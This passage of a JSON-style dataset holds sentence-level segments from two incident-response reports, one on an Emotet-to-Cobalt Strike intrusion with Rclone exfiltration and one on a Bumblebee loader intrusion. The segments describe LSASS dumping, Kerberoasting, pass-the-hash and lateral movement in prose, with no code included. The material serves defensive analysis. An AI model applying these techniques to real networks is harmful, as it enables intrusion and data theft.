        "text": "After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 3,
        "index": 4717
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S4",
        "text": "Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.",
        "type": "",
        "report": "r-dfir-10",
        "line": 4,
        "index": 4718
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S5",
        "text": "This entailed connecting to various email servers and sending new emails with attached xls and zip files.",
        "type": "",
        "report": "r-dfir-10",
        "line": 5,
        "index": 4719
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S6",
        "text": "This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 6,
        "index": 4720
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S7",
        "text": "Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.",
        "type": "",
        "report": "r-dfir-10",
        "line": 7,
        "index": 4721
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S8",
        "text": "Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.",
        "type": "",
        "report": "r-dfir-10",
        "line": 8,
        "index": 4722
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S9",
        "text": "Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.",
        "type": "",
        "report": "r-dfir-10",
        "line": 9,
        "index": 4723
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S10",
        "text": "Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 10,
        "index": 4724
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S11",
        "text": "At 29 hours from initial access, the threat actors began their first lateral movement.",
        "type": "",
        "report": "r-dfir-10",
        "line": 11,
        "index": 4725
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S12",
        "text": "This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.",
        "type": "",
        "report": "r-dfir-10",
        "line": 12,
        "index": 4726
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S13",
        "text": "From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.",
        "type": "",
        "report": "r-dfir-10",
        "line": 13,
        "index": 4727
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S14",
        "text": "Pass-the-Hash behavior was observed targeting several accounts on the lateral host.",
        "type": "",
        "report": "r-dfir-10",
        "line": 14,
        "index": 4728
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S15",
        "text": "Use of Cobalt Strike\u2019s Get-System module was also apparent via the logs.",
        "type": "",
        "report": "r-dfir-10",
        "line": 15,
        "index": 4729
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S16",
        "text": "The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.",
        "type": "",
        "report": "r-dfir-10",
        "line": 16,
        "index": 4730
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S17",
        "text": "More account discovery was then observed, with queries for Domain Administrators and a backup account.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 17,
        "index": 4731
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S18",
        "text": "At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.",
        "type": "",
        "report": "r-dfir-10",
        "line": 18,
        "index": 4732
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S19",
        "text": "Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.",
        "type": "",
        "report": "r-dfir-10",
        "line": 19,
        "index": 4733
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S20",
        "text": "After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera\u2013for an additional means of persistence and command and control.",
        "type": "",
        "report": "r-dfir-10",
        "line": 20,
        "index": 4734
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S21",
        "text": "During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.",
        "type": "",
        "report": "r-dfir-10",
        "line": 21,
        "index": 4735
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S22",
        "text": "They returned the next day, at the same time as the previous day, and picked up where they left off.",
        "type": "",
        "report": "r-dfir-10",
        "line": 22,
        "index": 4736
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S23",
        "text": "They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.",
        "type": "",
        "report": "r-dfir-10",
        "line": 23,
        "index": 4737
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S24",
        "text": "Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.",
        "type": "",
        "report": "r-dfir-10",
        "line": 24,
        "index": 4738
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S25",
        "text": "Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.",
        "type": "",
        "report": "r-dfir-10",
        "line": 25,
        "index": 4739
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S26",
        "text": "Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter \u2013ignore-existing from two different hosts on the network.",
        "type": "",
        "report": "r-dfir-10",
        "line": 26,
        "index": 4740
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S27",
        "text": "Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 27,
        "index": 4741
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S28",
        "text": "On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.",
        "type": "",
        "report": "r-dfir-10",
        "line": 28,
        "index": 4742
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S29",
        "text": "This was the last activity we observed from this group.",
        "type": "",
        "report": "r-dfir-10",
        "line": 29,
        "index": 4743
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S30",
        "text": "These cases commonly end up with ransomware in addition to data exfiltration.",
        "type": "",
        "report": "r-dfir-10",
        "line": 30,
        "index": 4744
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S31",
        "text": "This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 31,
        "index": 4745
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S32",
        "text": "The threat actor gained access to the environment after a user opened an Excel document and enabled macros.",
        "type": "",
        "report": "r-dfir-10",
        "line": 32,
        "index": 4746
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S33",
        "text": "The document came in via email in the form of a zip file which included an xls file.",
        "type": "",
        "report": "r-dfir-10",
        "line": 33,
        "index": 4747
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S34",
        "text": "Thanks for sharing @proxylife!\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 34,
        "index": 4748
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S35",
        "text": "Mixture of lnk files and xls files being sent.",
        "type": "",
        "report": "r-dfir-10",
        "line": 35,
        "index": 4749
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S36",
        "text": "I am playing catching up updating my git with IOC's!\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 36,
        "index": 4750
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S37",
        "text": "The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 37,
        "index": 4751
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S38",
        "text": "To deobfuscate the document the tool xlmdeobfuscator was used with the following output.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 38,
        "index": 4752
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S39",
        "text": "After deobfuscation and cleaned up, the code in the macro looks as follows.",
        "type": "",
        "report": "r-dfir-10",
        "line": 39,
        "index": 4753
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S40",
        "text": "The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .",
        "type": "",
        "report": "r-dfir-10",
        "line": 40,
        "index": 4754
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S41",
        "text": "Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.",
        "type": "",
        "report": "r-dfir-10",
        "line": 41,
        "index": 4755
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S42",
        "text": "A new file is then created in C:\\%USERPROFILE%\\AppData\\Local\\ with a folder that also consists of random characters.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 42,
        "index": 4756
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S43",
        "text": "The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 43,
        "index": 4757
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S44",
        "text": "Sysmon showing Emotet starting the Cobalt Strike executable.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 44,
        "index": 4758
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S45",
        "text": "A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens\u2019s fantastic tool 1768.py.",
        "type": "",
        "report": "r-dfir-10",
        "line": 45,
        "index": 4759
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S46",
        "text": "Here, the tool is used with a process dump of the executable.",
        "type": "",
        "report": "r-dfir-10",
        "line": 46,
        "index": 4760
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S47",
        "text": "The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 47,
        "index": 4761
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S48",
        "text": "This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 48,
        "index": 4762
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S49",
        "text": "Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
        "type": "",
        "report": "r-dfir-10",
        "line": 49,
        "index": 4763
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S50",
        "text": "Use of Cobalt Strike\u2019s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 50,
        "index": 4764
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S51",
        "text": "Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
        "type": "",
        "report": "r-dfir-10",
        "line": 51,
        "index": 4765
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S52",
        "text": "Emotet injected multiple times into svchost to execute certain functions, including discovery commands.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 52,
        "index": 4766
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S53",
        "text": "Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.",
        "type": "",
        "report": "r-dfir-10",
        "line": 53,
        "index": 4767
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S54",
        "text": "We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",
        "type": "",
        "report": "r-dfir-10",
        "line": 54,
        "index": 4768
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S55",
        "text": "Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 55,
        "index": 4769
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S56",
        "text": "From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
        "type": "",
        "report": "r-dfir-10",
        "line": 56,
        "index": 4770
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S57",
        "text": "Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.",
        "type": "",
        "report": "r-dfir-10",
        "line": 57,
        "index": 4771
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S58",
        "text": "Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 58,
        "index": 4772
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S59",
        "text": "We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 59,
        "index": 4773
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S60",
        "text": "On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.",
        "type": "",
        "report": "r-dfir-10",
        "line": 60,
        "index": 4774
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S61",
        "text": "On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host\u2019s Windows domain.",
        "type": "",
        "report": "r-dfir-10",
        "line": 61,
        "index": 4775
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S62",
        "text": "The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.",
        "type": "",
        "report": "r-dfir-10",
        "line": 62,
        "index": 4776
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S63",
        "text": "AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.",
        "type": "",
        "report": "r-dfir-10",
        "line": 63,
        "index": 4777
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S64",
        "text": "The contents of the script are below:\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 64,
        "index": 4778
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S65",
        "text": "Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat.",
        "type": "",
        "report": "r-dfir-10",
        "line": 65,
        "index": 4779
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S66",
        "text": "The batch file contained one line, which pinged a list of servers (servers.txt).",
        "type": "",
        "report": "r-dfir-10",
        "line": 66,
        "index": 4780
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S67",
        "text": "The line can be seen below:\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 67,
        "index": 4781
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S68",
        "text": "Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.",
        "type": "",
        "report": "r-dfir-10",
        "line": 68,
        "index": 4782
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S69",
        "text": "The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts.",
        "type": "",
        "report": "r-dfir-10",
        "line": 69,
        "index": 4783
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S70",
        "text": "Example:\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 70,
        "index": 4784
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S71",
        "text": "Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.",
        "type": "",
        "report": "r-dfir-10",
        "line": 71,
        "index": 4785
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S72",
        "text": "The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 72,
        "index": 4786
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S73",
        "text": "We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons.",
        "type": "",
        "report": "r-dfir-10",
        "line": 73,
        "index": 4787
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S74",
        "text": "Threat actors used PTH to acquire a session with elevated user access.",
        "type": "",
        "report": "r-dfir-10",
        "line": 74,
        "index": 4788
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S75",
        "text": "We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.",
        "type": "",
        "report": "r-dfir-10",
        "line": 75,
        "index": 4789
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S76",
        "text": "Source Host:\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 76,
        "index": 4790
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S77",
        "text": "Domain Controller:\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 77,
        "index": 4791
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S78",
        "text": "You can read more about detecting \u201cPass-The-Hash\u201d here by Stealthbits and here by Hausec.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 78,
        "index": 4792
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S79",
        "text": "In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 79,
        "index": 4793
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S80",
        "text": "The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 80,
        "index": 4794
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S81",
        "text": "Emotet, later on, deployed Cobalt Strike for additional functionality.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 81,
        "index": 4795
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S82",
        "text": "Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion.",
        "type": "",
        "report": "r-dfir-10",
        "line": 82,
        "index": 4796
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S83",
        "text": "Atera granted the threat actors with interactive access.",
        "type": "",
        "report": "r-dfir-10",
        "line": 83,
        "index": 4797
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S84",
        "text": "We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 84,
        "index": 4798
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S85",
        "text": "The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage.",
        "type": "",
        "report": "r-dfir-10",
        "line": 85,
        "index": 4799
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S86",
        "text": "Command line logging revealed the destination to be the Mega service and the network shares targeted.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 86,
        "index": 4800
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S87",
        "text": "This activity was also visible on the network via Zeek logs showing the SMB share connection activity.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 87,
        "index": 4801
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S88",
        "text": "Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns.",
        "type": "",
        "report": "r-dfir-10",
        "line": 88,
        "index": 4802
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S89",
        "text": "In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.",
        "type": "",
        "report": "r-dfir-10",
        "line": 89,
        "index": 4803
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S90",
        "text": "The Emotet mailer started roughly once each day during the intrusion.",
        "type": "",
        "report": "r-dfir-10",
        "line": 90,
        "index": 4804
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S91",
        "text": "Marked by bursts of connection to various email servers.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 91,
        "index": 4805
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S92",
        "text": "The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 92,
        "index": 4806
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S93",
        "text": "We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware.",
        "type": "",
        "report": "r-dfir-10",
        "line": 93,
        "index": 4807
    },
    {
        "id": "dfir-reports-filtered/r-dfir-10.md:::S94",
        "text": "We have a case coming up in a few weeks where it does exactly that.\n",
        "type": "",
        "report": "r-dfir-10",
        "line": 94,
        "index": 4808
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S0",
        "text": "In this intrusion, the threat actors operated in an environment over an 11 day dwell period.",
        "type": "",
        "report": "r-dfir-11",
        "line": 0,
        "index": 4809
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S1",
        "text": "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",
        "type": "",
        "report": "r-dfir-11",
        "line": 1,
        "index": 4810
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S2",
        "text": "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",
        "type": "",
        "report": "r-dfir-11",
        "line": 2,
        "index": 4811
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S3",
        "text": "When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader.",
        "type": "",
        "report": "r-dfir-11",
        "line": 3,
        "index": 4812
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S4",
        "text": "From there, the loader reached out to the Bumblebee C2 servers.",
        "type": "",
        "report": "r-dfir-11",
        "line": 4,
        "index": 4813
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S5",
        "text": "At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",
        "type": "",
        "report": "r-dfir-11",
        "line": 5,
        "index": 4814
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S6",
        "text": "This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
        "type": "",
        "report": "r-dfir-11",
        "line": 6,
        "index": 4815
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S7",
        "text": "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.",
        "type": "",
        "report": "r-dfir-11",
        "line": 7,
        "index": 4816
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S8",
        "text": "Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.",
        "type": "",
        "report": "r-dfir-11",
        "line": 8,
        "index": 4817
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S9",
        "text": "The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.",
        "type": "",
        "report": "r-dfir-11",
        "line": 9,
        "index": 4818
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S10",
        "text": "The threat actor then started Active Directory discovery using Adfind.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 10,
        "index": 4819
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S11",
        "text": "After this activity, the threat actors went silent.",
        "type": "",
        "report": "r-dfir-11",
        "line": 11,
        "index": 4820
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S12",
        "text": "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 12,
        "index": 4821
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S13",
        "text": "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
        "type": "",
        "report": "r-dfir-11",
        "line": 13,
        "index": 4822
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S14",
        "text": "AdFind was used again as well.",
        "type": "",
        "report": "r-dfir-11",
        "line": 14,
        "index": 4823
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S15",
        "text": "Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",
        "type": "",
        "report": "r-dfir-11",
        "line": 15,
        "index": 4824
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S16",
        "text": "They then used remote services to execute Procdump, which was used to dump LSASS.",
        "type": "",
        "report": "r-dfir-11",
        "line": 16,
        "index": 4825
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S17",
        "text": "At this point, the actors appeared to be searching for more access then they currently had.",
        "type": "",
        "report": "r-dfir-11",
        "line": 17,
        "index": 4826
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S18",
        "text": "While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Admin or similarly highly privileged account.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 18,
        "index": 4827
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S19",
        "text": "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
        "type": "",
        "report": "r-dfir-11",
        "line": 19,
        "index": 4828
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S20",
        "text": "Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery.",
        "type": "",
        "report": "r-dfir-11",
        "line": 20,
        "index": 4829
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S21",
        "text": "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
        "type": "",
        "report": "r-dfir-11",
        "line": 21,
        "index": 4830
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S22",
        "text": "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
        "type": "",
        "report": "r-dfir-11",
        "line": 22,
        "index": 4831
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S23",
        "text": "After injecting into various processes, the threat actors executed the PowerShell module Invoke-Kerberoast.",
        "type": "",
        "report": "r-dfir-11",
        "line": 23,
        "index": 4832
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S24",
        "text": "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
        "type": "",
        "report": "r-dfir-11",
        "line": 24,
        "index": 4833
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S25",
        "text": "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
        "type": "",
        "report": "r-dfir-11",
        "line": 25,
        "index": 4834
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S26",
        "text": "These batch scripts\u2019 purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 26,
        "index": 4835
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S27",
        "text": "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
        "type": "",
        "report": "r-dfir-11",
        "line": 27,
        "index": 4836
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S28",
        "text": "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
        "type": "",
        "report": "r-dfir-11",
        "line": 28,
        "index": 4837
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S29",
        "text": "This service account had a weak password, which was most likely cracked offline after being kerberoasted earlier in the intrusion.",
        "type": "",
        "report": "r-dfir-11",
        "line": 29,
        "index": 4838
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S30",
        "text": "The threat actors were then evicted from the environment before any final actions could be taken.",
        "type": "",
        "report": "r-dfir-11",
        "line": 30,
        "index": 4839
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S31",
        "text": "We assess based on the level of access and discovery activity from the final day, the likely final actions would have been a domain wide ransom deployment.\n",
        "type": "",
        "report": "r-dfir-11",
        "line": 31,
        "index": 4840
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S32",
        "text": "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",
        "type": "",
        "report": "r-dfir-11",
        "line": 32,
        "index": 4841
    },
    {
        "id": "dfir-reports-filtered/r-dfir-11.md:::S33",
